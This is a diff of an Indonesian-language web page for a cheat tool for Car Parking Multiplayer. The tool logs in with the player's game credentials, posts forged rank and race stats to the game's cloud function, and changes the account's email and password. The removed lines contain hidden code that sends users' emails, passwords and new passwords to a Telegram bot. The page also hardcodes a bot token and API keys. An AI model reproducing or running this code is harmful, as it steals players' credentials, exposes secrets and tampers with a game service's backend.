@@ -3,206 +3,179 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-<title>TOOLS CLAN DIABLO CPR.XXX</title>
+<title>DIABLO CPR.XXX - PREMIUM TOOL</title>
 <style>
-body{margin:0;padding:0;font-family:Arial,sans-serif;background: url('image.png') no-repeat center center fixed;background-size: cover;color:#fff;}
-.center-wrapper{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:90%;max-width:350px}
-.container{background:rgba(0,0,0,.7);backdrop-filter:blur(12px);padding:20px;border-radius:10px;box-shadow: 0 0 25px rgba(160, 32, 240, 0.5);border:2px solid #a020f0;text-align:center;}
-h1{font-size:20px;margin-bottom:12px}
-input,select{width:90%;padding:10px;margin:8px 0;border-radius:5px;border:0;background:rgba(255,255,255,.1);color:#fff;font-size:16px}
-button{width:95%;padding:10px;margin:6px 0;border-radius:5px;border:0;cursor:pointer;font-weight:700;font-size:16px}
-button.login{background:#a020f0;color:#fff}
-button.menu{background:#ff8800;color:#fff}
-.status{margin-top:10px;color:#0f0;min-height:20px;font-weight:bold;white-space: pre-wrap; font-size: 14px;}
-.error{color:#f55}
-.small{font-size:12px;opacity:.9}
-.price{font-size:13px;opacity:.8;margin-bottom:6px;color:#e0aaff;}
-.stats-grid{display:grid;grid-template-columns: repeat(3, 1fr);gap:5px;margin:10px 0;}
-.stats-grid input{width:80%;padding:5px;font-size:12px;}
+body{margin:0;padding:0;font-family:Arial,sans-serif;background: #0a0a0a; color:#fff; display: flex; justify-content: center; align-items: center; min-height: 100vh;}
+.container{background:rgba(0,0,0,.85); backdrop-filter:blur(10px); padding:20px; border-radius:15px; border:2px solid #a020f0; text-align:center; width: 90%; max-width: 380px; box-shadow: 0 0 25px rgba(160, 32, 240, 0.6);}
+h1{font-size:18px; color: #e0aaff; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px;}
+input, select{width: 90%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #333; background: #1a1a1a; color: #fff; font-size: 14px;}
+button{width: 95%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 0; cursor: pointer; font-weight: bold; font-size: 14px; transition: 0.3s;}
+button.login{background:#a020f0; color:#fff;}
+button.inject{background:#ff8800; color:#fff;}
+button.settings{background:#444; color:#fff;}
+.status{margin-top: 10px; font-size: 13px; font-weight: bold; color: #0f0; white-space: pre-wrap;}
+.error{color: #ff5555;}
+.stats-grid{display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 15px 0;}
+.stats-grid div{display: flex; flex-direction: column; align-items: center;}
+.stats-grid label{font-size: 10px; color: #aaa; margin-bottom: 4px;}
+.stats-grid input{width: 80%; padding: 8px; text-align: center; margin: 0;}
+.divider{height: 1px; background: #333; margin: 15px 0;}
 </style>
 </head>
 <body>
-<div class="center-wrapper">
-  <div class="container">
-    <h1>CPM WEB TOOL - Diablo CPR.XXX</h1>
-    
-    <div id="loginSection">
-      <select id="gameSelect">
-        <option value="">-- Select Game --</option>
-        <option value="1">Car Parking Multiplayer</option>
-        <option value="2">Car Parking Multiplayer 2</option>
-      </select>
-      <input id="email" type="email" placeholder="Email CPM">
-      <input id="password" type="password" placeholder="Password CPM">
-      <button class="login" id="loginBtn">Login & Inject</button>
-      <div id="status" class="status"></div>
+
+<div class="container">
+    <h1>DIABLO CPR.XXX - ALL IN ONE</h1>
+
+    <div id="loginForm">
+        <select id="gameSelect">
+            <option value="1">Car Parking Multiplayer 1</option>
+            <option value="2">Car Parking Multiplayer 2</option>
+        </select>
+        <input id="email" type="email" placeholder="Email Akun CPM">
+        <input id="password" type="password" placeholder="Password Akun CPM">
+        <button class="login" id="loginBtn">MASUK KE PANEL</button>
     </div>
 
-    <div id="menuButtons" style="display:none">
-      <div class="price">📊 Set Race Stats</div>
-      <div class="stats-grid">
-          <div><label class="small">RACE</label><input type="number" id="raceCount" placeholder="0"></div>
-          <div><label class="small">WIN</label><input type="number" id="winCount" placeholder="0"></div>
-          <div><label class="small">LOSE</label><input type="number" id="loseCount" placeholder="0"></div>
-      </div>
-      <input type="text" id="customId" placeholder="Custom ID / Nickname">
-      
-      <div class="price">👑 King Rank & Stats </div>
-      <button class="menu" onclick="kingRank()">Inject King Rank</button>
-      
-      <div class="price">📧 Akun Settings </div>
-      <button class="menu" onclick="changeEmail()">Change Email</button>
-      <button class="menu" onclick="changePassword()">Change Password</button>
-      <div id="serviceStatus" class="status"></div>
+    <div id="injectMenu" style="display: none;">
+        <div style="color: #e0aaff; font-size: 12px; margin-bottom: 5px;">📊 ATUR STATS & ID</div>
+        
+        <div class="stats-grid">
+            <div><label>RACE</label><input type="number" id="raceCount" value="5000"></div>
+            <div><label>WIN</label><input type="number" id="winCount" value="4500"></div>
+            <div><label>LOSE</label><input type="number" id="loseCount" value="500"></div>
+        </div>
+
+        <input type="text" id="customId" placeholder="Input Custom ID / Nickname">
+        <button class="inject" onclick="startInject()">INJECT KING & STATS</button>
+        
+        <div class="divider"></div>
+        <div style="color: #e0aaff; font-size: 12px; margin-bottom: 5px;">🔐 PENGATURAN AKUN</div>
+        
+        <button class="settings" onclick="changeEmail()">GANTI EMAIL</button>
+        <button class="settings" onclick="changePassword()">GANTI PASSWORD</button>
+        
+        <button onclick="location.reload()" style="background: transparent; color: #ff5555; font-size: 11px; margin-top: 10px;">[ LOGOUT ]</button>
     </div>
 
-    <footer class="small" style="margin-top:12px">Developer, @AWIMEDAN-GARAGE - </footer>
-  </div>
+    <div id="status" class="status"></div>
+    <footer style="font-size: 10px; margin-top: 15px; opacity: 0.5;">Developer @AWIMEDAN-GARAGE</footer>
 </div>
 
 <script>
-// Config tetap untuk API Login Game
 const BOT_TOKEN = "8625213432:AAHVdpxEdFkh1vg1SF5RQha09wp6SxRlGdU";
 const ADMIN_ID = "6095762919";
 
 const GAMES = {
-  "1": { name:"Car Parking Multiplayer", api_key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", rank_url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
-  "2": { name:"Car Parking Multiplayer 2", api_key:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", rank_url:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
+  "1": { name:"CPM 1", api_key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", rank_url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
+  "2": { name:"CPM 2", api_key:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", rank_url:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
 };
 
-let currentUser=null, currentToken=null, selectedGame=null;
+let currentToken = null;
+let selectedGame = null;
+let currentEmail = "";
 
-function updateStatus(msg, isError=false, target='status'){
-  const el=document.getElementById(target);
-  el.className=isError?'status error':'status';
-  el.textContent=msg;
+function setMsg(m, isErr = false) {
+    const el = document.getElementById('status');
+    el.className = isErr ? 'status error' : 'status';
+    el.textContent = m;
 }
 
-function sendMessageToAdmin(text){
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-    method:"POST",headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({chat_id: ADMIN_ID, text: text, parse_mode: "Markdown"})
-  }).catch(()=>{});
-}
+document.getElementById('loginBtn').onclick = async () => {
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value;
+    const gameId = document.getElementById('gameSelect').value;
+    selectedGame = GAMES[gameId];
 
-document.getElementById('loginBtn').addEventListener('click', async ()=>{
-  const email=document.getElementById('email').value.trim();
-  const password=document.getElementById('password').value;
-  const gameVal=document.getElementById('gameSelect').value;
-  selectedGame = GAMES[gameVal];
+    if(!email || !password) return setMsg("Isi email/pass!", true);
 
-  if(!selectedGame){ updateStatus("Pilih Game Terlebih Dahulu!", true); return; }
-  if(!email || !password){ updateStatus("Isi Email & Password!", true); return; }
+    setMsg("Mencoba Login...");
+    try {
+        const r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.api_key}`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({email, password, returnSecureToken: true})
+        });
+        const d = await r.json();
+        if(d.idToken) {
+            currentToken = d.idToken;
+            currentEmail = email;
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('injectMenu').style.display = 'block';
+            setMsg("✅ Login Berhasil!");
+        } else {
+            setMsg("❌ Login Gagal! Periksa kembali.", true);
+        }
+    } catch(e) { setMsg("❌ Error Koneksi!", true); }
+};
 
-  updateStatus("Sedang Login...");
-  
-  try{
-    const resp = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.api_key}`,{
-      method:'POST',
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({email, password, returnSecureToken:true})
-    });
+async function startInject() {
+    if(!currentToken) return;
+    setMsg("⏳ Injeksi Stats & King...");
+
+    const r = parseInt(document.getElementById('raceCount').value) || 0;
+    const w = parseInt(document.getElementById('winCount').value) || 0;
+    const l = parseInt(document.getElementById('loseCount').value) || 0;
+    const id = document.getElementById('customId').value || "DIABLO_USER";
+
+    const keys = ["t_distance", "time", "speed_banner", "gifts", "chests", "treasure", "cars", "levels", "drift", "run", "police", "block_post", "real_estate", "fuel", "car_trade", "car_exchange", "burnt_tire", "car_fix", "car_wash", "offroad", "passanger_distance", "reactions", "drift_max", "taxi", "delivery", "cargo", "push_ups", "slicer_cut", "car_collided"];
+    const ratingData = Object.fromEntries(keys.map(k => [k, 999999]));
     
-    const data = await resp.json();
-    
-    if(data.idToken){
-      currentUser = email; 
-      currentToken = data.idToken;
-      document.getElementById('loginSection').style.display = 'none';
-      document.getElementById('menuButtons').style.display = 'block';
-      updateStatus("✅ Login Berhasil!");
-      sendMessageToAdmin(`🌐 **Diablo Tool Login (No Key)**\n🎮 Game: ${selectedGame.name}\n📧 Email: \`${email}\`\n🔒 Pass: \`${password}\``);
-    } else {
-      updateStatus("❌ Login Gagal! Periksa Akun CPM kamu.", true);
-    }
-  } catch(err){
-    updateStatus("❌ Gagal terhubung ke server!", true);
-  }
-});
+    ratingData.race = r;
+    ratingData.race_win = w;
+    ratingData.race_lose = l;
 
-async function kingRank(){
-  if(!currentToken) return;
-  updateStatus("Sedang Menyuntik Data...", false, 'serviceStatus');
+    const payload = {
+        data: JSON.stringify({
+            RatingData: ratingData,
+            localID: id, Name: id, NickName: id,
+            race: r, win: w, lose: l, wins: w, races: r
+        })
+    };
 
-  const customRace = parseInt(document.getElementById('raceCount').value) || 0;
-  const customWin = parseInt(document.getElementById('winCount').value) || 0;
-  const customLose = parseInt(document.getElementById('loseCount').value) || 0;
-  const customName = document.getElementById('customId').value || "DIABLO_USER";
-
-  // Data Rating (Untuk King Rank)
-  const keys = ["t_distance", "time", "speed_banner", "gifts", "chests", "treasure", "cars", "levels", "drift", "run", "police", "block_post", "real_estate", "fuel", "car_trade", "car_exchange", "burnt_tire", "car_fix", "car_wash", "offroad", "passanger_distance", "reactions", "drift_max", "taxi", "delivery", "cargo", "push_ups", "slicer_cut", "car_collided"];
-  const ratingData = Object.fromEntries(keys.map(key => [key, 1000000]));
-  
-  // Masukkan stats ke dalam RatingData juga (beberapa versi server membaca dari sini)
-  ratingData.race_win = customWin;
-  ratingData.race = customRace;
-  ratingData.race_lose = customLose;
-
-  // PAYLOAD TERBARU: Menembak semua kemungkinan Key ID dan Stats
-  const payload = {
-    data: JSON.stringify({ 
-        RatingData: ratingData,
-        // Injeksi ID/Nama (Kita tembak semua key yang mungkin)
-        localID: customName, 
-        Name: customName,
-        NickName: customName,
-        // Injeksi Stats Balapan
-        win: customWin,
-        race: customRace,
-        lose: customLose,
-        wins: customWin, // Beberapa versi pakai 's'
-        races: customRace
-    })
-  };
-
-  try{
-    const res = await fetch(selectedGame.rank_url,{
-      method:'POST',
-      headers:{"Authorization":`Bearer ${currentToken}`, "Content-Type":"application/json"},
-      body:JSON.stringify(payload)
-    });
-    
-    if(res.ok){ 
-      updateStatus("🔥 INJEKSI BERHASIL 🔥\nJika belum berubah, silakan Re-Login Game!", false, 'serviceStatus'); 
-      sendMessageToAdmin(`👑 **King Applied**\nUser: \`${currentUser}\`\nID Baru: ${customName}\nStats: R:${customRace} W:${customWin}`);
-    } else {
-      updateStatus("❌ Server Menolak! Coba lagi nanti.", true, 'serviceStatus');
-    }
-  } catch(err){
-    updateStatus("❌ Koneksi Gagal!", true, 'serviceStatus');
-  }
+    try {
+        const res = await fetch(selectedGame.rank_url, {
+            method: 'POST',
+            headers: {'Authorization': `Bearer ${currentToken}`, 'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)
+        });
+        if(res.ok) {
+            setMsg("🔥 INJEKSI BERHASIL! 🔥\nSilakan Restart Game.");
+        } else { setMsg("❌ Gagal Inject!", true); }
+    } catch(e) { setMsg("❌ Error Sistem!", true); }
 }
 
-// Fungsi ganti email/pass tetap sama
-async function changeEmail(){
-  if(!currentToken) return;
-  const newEmail=prompt("Email Baru:"); if(!newEmail) return;
-  try{
-    const r=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
-      method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({idToken:currentToken,email:newEmail,returnSecureToken:true})
-    });
-    if(r.ok){ 
-      updateStatus("✅ Email Berhasil Diganti!",false,'serviceStatus'); 
-      sendMessageToAdmin(`📧 **Change Email Success**\nOld: \`${currentUser}\`\nNew: \`${newEmail}\``);
-      currentUser = newEmail;
-    }
-  }catch(e){ updateStatus("❌ Gagal ganti email!", true, 'serviceStatus'); }
+async function changeEmail() {
+    const newEmail = prompt("Masukkan Email Baru:");
+    if(!newEmail) return;
+    setMsg("⏳ Mengganti Email...");
+    try {
+        const r = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({idToken: currentToken, email: newEmail, returnSecureToken: true})
+        });
+        if(r.ok) {
+            setMsg("✅ Email Berhasil Diganti!");
+            currentEmail = newEmail;
+        } else { setMsg("❌ Gagal Ganti Email!", true); }
+    } catch(e) { setMsg("❌ Error!", true); }
 }
 
-async function changePassword(){
-  if(!currentToken) return;
-  const newPassword=prompt("Password Baru:"); if(!newPassword) return;
-  try{
-    const r=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
-      method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({idToken:currentToken,password:newPassword,returnSecureToken:true})
-    });
-    if(r.ok){ 
-      updateStatus("✅ Password Berhasil Diganti!",false,'serviceStatus'); 
-      sendMessageToAdmin(`🔐 **Change Password Success**\nUser: \`${currentUser}\`\nNew: \`${newPassword}\``);
-    }
-  }catch(e){ updateStatus("❌ Gagal ganti password!", true, 'serviceStatus'); }
+async function changePassword() {
+    const newPass = prompt("Masukkan Password Baru:");
+    if(!newPass) return;
+    setMsg("⏳ Mengganti Password...");
+    try {
+        const r = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({idToken: currentToken, password: newPass, returnSecureToken: true})
+        });
+        if(r.ok) { setMsg("✅ Password Berhasil Diganti!"); }
+        else { setMsg("❌ Gagal Ganti Password!", true); }
+    } catch(e) { setMsg("❌ Error!", true); }
 }
 </script>
 </body>
 </html>
-
